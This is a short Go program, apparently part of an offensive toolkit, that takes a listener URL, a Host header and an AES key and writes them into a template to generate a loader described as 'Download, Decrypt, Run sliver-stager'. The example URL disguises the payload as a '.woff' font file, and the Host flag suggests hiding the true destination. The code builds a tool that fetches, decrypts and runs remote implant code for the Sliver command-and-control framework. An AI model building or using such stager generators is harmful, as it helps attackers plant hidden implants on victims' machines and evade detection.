package main

import (
	"fmt"
	"html/template"
	"log"
	"os"

	"github.com/projectdiscovery/goflags"
)

type options struct {
	Url  string
	Host string
	Key  string
}

func main() {
	opt := options{}
	flagSet := goflags.NewFlagSet()
	flagSet.SetDescription("Download, Decrypt, Run sliver-stager")
	flagSet.StringVarP(&opt.Url, "url", "u", "", "stager-listner, Example: http://abc.com:8443/abc.woff")
	flagSet.StringVarP(&opt.Host, "host", "H", "", "Host header, Example: abc.abc.com")
	flagSet.StringVarP(&opt.Key, "key", "k", "", "AES Key")
	if err := flagSet.Parse(); err != nil {
		log.Fatalf("Couldn't Parse the flag: %s\n", err)
	}

	if opt.Url == "" {
		fmt.Printf("Need http url!\n")
		os.Exit(1)
	}

	writetmpl("pivottemplate/main.tmpl", opt)
}

func writetmpl(file string, opt options) {
	tmpl, err := template.ParseFiles(file)
	if err != nil {
		panic(err)
	}

	f, err := os.OpenFile("pivottemplate/main.go", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0664)
	if err != nil {
		panic(err)
	}

	err = tmpl.Execute(f, opt)
	if err != nil {
		panic(err)
	}
}
